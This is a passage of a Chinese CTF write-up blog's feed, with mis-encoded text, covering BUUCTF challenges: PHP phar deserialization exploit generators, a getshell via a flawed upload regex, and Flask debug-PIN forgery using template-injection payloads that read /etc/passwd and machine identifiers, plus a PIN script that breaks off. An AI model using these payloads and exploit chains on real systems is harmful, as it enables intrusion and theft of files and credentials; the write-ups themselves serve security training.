class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c1e4r = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$c1e4r-&gt;str = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line">$test-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line">$phar-&gt;setMetadata($c1e4r); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆexp.pharåæ”¹åç¼€ä¸ºgifï¼Œç„¶åæŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶å</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000059.png" alt=""></p><p>æœ€åä½¿ç”¨pharåè®®è¯»å–è¯¥æ–‡ä»¶ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816000157.png" alt=""></p><p>è§£ç å¾—åˆ°flagã€‚</p><h2 id="GXYCTF2019-Babysqli-v3">GXYCTF2019 Babysqli v3</h2><h3 id="è€ƒç‚¹-v13">è€ƒç‚¹</h3><ul><li>å¼±å£ä»¤</li><li>PHPååºåˆ—åŒ–</li></ul><h3 id="è§£é¢˜-v13">è§£é¢˜</h3><p>å¼±å£ä»¤çˆ†ç ´ã€‚ã€‚ã€‚ã€‚ã€‚å¾—åˆ°admin/passwordã€‚</p><p>PHPä¼ªåè®®è¯»å–æºç <code>php://filter/read=convert.base64-encode/resource=home.php</code></p><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å½“å‰å¼•ç”¨çš„æ˜¯ &quot;</span>.$file;</span><br><span class="line"><span class="keyword">require</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Filename;</span><br><span class="line"><span class="keyword">public</span> $cmd;</span><br><span class="line"><span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â€²â–½`ã€ƒ)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> $sandbox;</span><br><span class="line"><span class="keyword">global</span> $ext;</span><br><span class="line"><span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="é¢„æœŸè§£">é¢„æœŸè§£</h4><p>Pharååºåˆ—åŒ–</p><p>å…ˆä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è·å¾—tokençš„å€¼</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122813.png" alt=""></p><p>ç”Ÿæˆpharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Uploader();</span><br><span class="line">$upload-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">$upload-&gt;Filename = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">$upload-&gt;token = <span class="string">&#x27;GXY063c630ae7ab41c6fd121cb4851620a3&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($upload); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ç”Ÿæˆçš„pharä¸Šä¼ </p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123304.png" alt=""></p><p>å¾—åˆ°è·¯å¾„<code>/var/www/html/uploads/cdc81ac06b78e980da728ecd95e747a8/GXY063c630ae7ab41c6fd121cb4851620a3.txt</code></p><p>ç„¶åå°†è¿™ä¸ªè·¯å¾„å¸¦ä¸Š<code>phar://</code>ä½œä¸ºnameå‚æ•°çš„å€¼ï¼Œå†éšæ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå› ä¸º<code>$this-&gt;Filename</code>è¢«æˆ‘ä»¬æ‰‹å·¥æŒ‡å®šä¸ºpharï¼Œè§¦å‘äº†pharååºåˆ—åŒ–å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123754.png" alt=""></p><h4 id="éé¢„æœŸè§£1">éé¢„æœŸè§£1</h4><p>å…³é”®çš„åœ°æ–¹åœ¨äºæ­£åˆ™å†™çš„æœ‰é—®é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸ŠåŒ¹é…çš„æ˜¯<code> .</code>ï¼ˆç©ºæ ¼ç‚¹ï¼‰ã€‚``upload()<code>å†…ï¼Œåªè¦æ–‡ä»¶å°äº1024ï¼Œå°±å°†ä¸Šä¼ æ–‡ä»¶åˆ°</code>$this-&gt;Filename`</p><p>é‚£æˆ‘ä»¬åªè¦ä½¿<code>$this-&gt;Filename</code>ä¸º<code>/var/www/html/uploads/shell.php</code>ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªtxtçš„ä¸€å¥è¯å³å¯getshell</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122133.png" alt=""></p><h4 id="éé¢„æœŸè§£2">éé¢„æœŸè§£2</h4><p>ç”±äºè¿™è¡Œä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents($uploader);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åä¼šæ˜¾ç¤ºå‡º<code>$uploader</code>è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥åªè¦ä½¿<code>$this-&gt;Filename</code>ä¸º<code>flag.php</code> ç„¶åéšä¾¿ä¼ ä¸ªä¸œè¥¿å°±ä¼šå¾—åˆ°flagäº†ã€‚</p><h2 id="MRCTF2020-Ezpop-Revenge">MRCTF2020 Ezpop_Revenge</h2><h3 id="TODO-v3">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–&quot;&gt;BUUCTFåˆ·é¢˜â€”â€”PHPååºåˆ—åŒ–&lt;/h1&gt;
&lt;h2 id=&quot;LCTF2018-Bestphpâ€™s-revenge&quot;&gt;LCTF2018 Bestphpâ€™s revenge&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™ç¯‡æ–‡ç« åˆ†æ
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”NodeJS</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS/</id>
    <published>2020-08-18T09:59:40.000Z</published>
    <updated>2020-08-18T11:22:57.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzNode">GKCTF2020 EZä¸‰å‰‘å®¢-EzNode</h2><h2 id="GYCTF2020-Node-Game">GYCTF2020 Node Game</h2><h2 id="GKCTF2020-Node-Exe">GKCTF2020 Node-Exe</h2><h2 id="GYCTF2020-Ez-Express">GYCTF2020 Ez_Express</h2><h2 id="HFCTF2020-EasyLogin">HFCTF2020 EasyLogin</h2><h2 id="HFCTF2020-JustEscape">HFCTF2020 JustEscape</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GKCTF2020-EZä¸‰å‰‘å®¢-EzNode&quot;&gt;GKCTF2020 EZä¸‰å‰‘å®¢-EzNode&lt;/h2&gt;
&lt;h2 id=&quot;GYCTF2020-Node-Game&quot;&gt;GYCTF2020 Node Game&lt;/h2&gt;
&lt;h2 id=&quot;GKCTF2020-Node-Exe
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="NodeJS" scheme="http://ca0y1h.top/categories/CTF/NodeJS/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”Python</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/</id>
    <published>2020-08-18T09:59:30.000Z</published>
    <updated>2020-09-17T05:28:18.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFåˆ·é¢˜â€”â€”Python">BUUCTFåˆ·é¢˜â€”â€”Python</h1><h2 id="GYCTF2020-flaskapp">GYCTF2020 flaskapp</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li><p>Flask debug pinç å®‰å…¨</p><p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p></li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><p>æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªhintç•Œé¢ï¼ŒæŸ¥çœ‹æºç </p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706152201.png" alt=""></p><p>æ„æ€åº”è¯¥æ˜¯å»ä¼ªé€ Flask pinç„¶åæ‰§è¡Œå‘½ä»¤ã€‚</p><p>å…ˆæ¥éªŒè¯ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160510.png" alt=""></p><p>ç„¶åè¿˜è¦æ‰¾åˆ°ä¸€ä¸ªè¯»æ–‡ä»¶çš„payloadï¼Œå‘ç°evalä¸èƒ½ç”¨ï¼Œç”¨openå¯ä»¥è¯»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160627.png" alt=""></p><p>æ¥ä¸‹æ¥å°±æ˜¯è¦è·å–6ä¸ªå…³é”®å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username # ç”¨æˆ·å</span><br><span class="line"></span><br><span class="line">modname # flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„</span><br><span class="line"></span><br><span class="line">uuid.getnode() # macåœ°å€åè¿›åˆ¶</span><br><span class="line"></span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªç”¨æˆ·åå¯ä»¥é€šè¿‡<code>/etc/passwd</code>å¾—åˆ°ï¼Œå³<code>flaskweb</code></p><p>ç¬¬äºŒä¸ªmodnameä¸€èˆ¬éƒ½æ˜¯é»˜è®¤çš„flask.app</p><p>ç¬¬ä¸‰ä¸ªä¹Ÿæ˜¯é»˜è®¤çš„Flask</p><p>ç¬¬å››ä¸ªæ˜¯<code>app.py</code>çš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŠ¥é”™æ¥è·å–</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161050.png" alt=""></p><p>ç¬¬å››ä¸ªmacåœ°å€å¦‚æœåœ¨çœŸå®ç¯å¢ƒæ˜¯ä»<code>/etc/machine-id</code>æ–‡ä»¶è¯»å–ï¼Œå¦‚æœæ˜¯åœ¨dockerä¸‹ï¼Œæ˜¯ä»<code>/sys/class/net/eth0/address</code>ç›®å½•ä¸‹è¯»å–ï¼Œè½¬æ¢æˆåè¿›åˆ¶<code>2485410468126</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161305.png" alt=""></p><blockquote><p>è½¬æ¢åœ°å€ï¼š<a href="https://www.vultr.com/resources/mac-converter/">https://www.vultr.com/resources/mac-converter/</a></p></blockquote><p>ç¬¬äº”ä¸ªé€šè¿‡è¯»å–<code>/proc/self/cgroup</code>è·å–machine-idï¼š1408f836b0ca514d796cbf8960e45fa1</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163205.png" alt=""></p><p>ç„¶åå†ä¸Šè„šæœ¬è·‘å‡ºPINç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è„šæœ¬å‡ºå¤„ï¼šhttps://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957891&#x27;</span>,<span class="comment"># address</span></span><br><span class="line">    <span class="string">&#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span 